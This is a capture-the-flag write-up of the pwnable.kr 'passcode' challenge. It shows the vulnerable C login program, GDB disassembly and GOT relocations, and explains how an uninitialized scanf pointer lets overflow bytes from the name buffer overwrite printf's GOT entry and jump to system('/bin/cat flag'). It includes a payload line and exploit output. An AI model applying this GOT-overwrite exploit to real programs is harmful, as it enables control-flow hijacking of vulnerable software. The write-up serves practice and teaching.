# passcode

## Description

```Text
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

## Analysis

```Shell
$ ssh passcode@pwnable.kr -p2222
...
passcode@pwnable:~$ ls -al
total 36
drwxr-x---   5 root passcode     4096 Oct 23  2016 .
drwxr-xr-x 115 root root         4096 Dec 22  2020 ..
d---------   2 root root         4096 Jun 26  2014 .bash_history
-r--r-----   1 root passcode_pwn   48 Jun 26  2014 flag
dr-xr-xr-x   2 root root         4096 Aug 20  2014 .irssi
-r-xr-sr-x   1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r--   1 root root          858 Jun 26  2014 passcode.c
drwxr-xr-x   2 root root         4096 Oct 23  2016 .pwntools-cache
passcode@pwnable:~$
```

Let’s take a look at the source:

```C
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
	scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
		printf("Login OK!\n");
		system("/bin/cat flag");
	}
	else{
		printf("Login Failed!\n");
		exit(0);
	}
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```

There are two lines write in the wrong way:

```C
scanf("%d", passcode1);
scanf("%d", passcode2);
```

Both `passcode1` and `passcode2` are not initialized after declaimed. So traditionally, the end bytes of the `name` in `welcome()` should stay on the stack when `passcode1` and `passcode2` are using.

More details with GDB:

```Shell
(gdb) disassemble welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   %ebp
   0x0804860a <+1>:	mov    %esp,%ebp
   0x0804860c <+3>:	sub    $0x88,%esp
   0x08048612 <+9>:	mov    %gs:0x14,%eax
   0x08048618 <+15>:	mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:	xor    %eax,%eax
   0x0804861d <+20>:	mov    $0x80487cb,%eax
   0x08048622 <+25>:	mov    %eax,(%esp)
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    $0x80487dd,%eax
   0x0804862f <+38>:	lea    -0x70(%ebp),%edx
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    $0x80487e3,%eax
   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
   0x08048646 <+61>:	mov    %edx,0x4(%esp)
   0x0804864a <+65>:	mov    %eax,(%esp)
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
   0x08048652 <+73>:	mov    -0xc(%ebp),%eax
   0x08048655 <+76>:	xor    %gs:0x14,%eax
   0x0804865c <+83>:	je     0x8048663 <welcome+90>
   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:	leave
   0x08048664 <+91>:	ret
End of assembler dump.
(gdb) disassemble login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave
   0x080485f0 <+140>:	ret
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb)
```

We can get that the address of `name` is `-0x70(%ebp)` and the address of `passcode1` is `-0x10(%ebp)`.

And coincidentally we also have `0x70-0x10 = 0x60 = 96`, which means that we can modify the contents of a memory address at will by overwriting `passcode1`.

At last, from `0x080485a0 <+60>:	call   0x8048420 <printf@plt>`, we only need to modify the address of the `printf` function to the address of the `0x080485e3 <+127>:	movl   $0x80487af,(%esp)` instruction to directly bypass the intermediate code and execute `system("/bin/cat flag");`.

```Shell
$ ssh passcode@pwnable.kr -p2222
...
passcode@pwnable:~$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin@@GLIBC_2.0
0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7


passcode@pwnable:~$
```

```Text
payload = "A" * 96 + p32(printf) + str(system_addr)
```

## Solution

Write-up: [exploit.py](exploit.py).

```Shell
$ python3 pwnable.kr/passcode/exploit.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] mistake@pwnable.kr:
    Distro    Unknown Unknown
    OS:       Unknown
    Arch:     Unknown
    Version:  0.0.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Starting remote process './passcode' on pwnable.kr: pid 284123
[+] Receiving all data: Done (288B)
[*] Stopped remote process 'passcode' on pwnable.kr (pid 284123)
b"Toddler's Secure Login System 1.0 beta.\nenter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04\xa0\x04\x08!\nSorry mom.. I got confused about scanf usage :(\nenter passcode1 : Now I can safely trust you that you have credential :)\n"
[*] Closed connection to 'pwnable.kr'
```

## Point

- [Global Offset Table](https://github.com/ZiyaoXie/ZiyaoXie/blob/main/linux/global_offset_table.md)
- [Attack Lab](https://github.com/ZiyaoXie/Pwn/blob/main/labs/attack_lab/README.md)
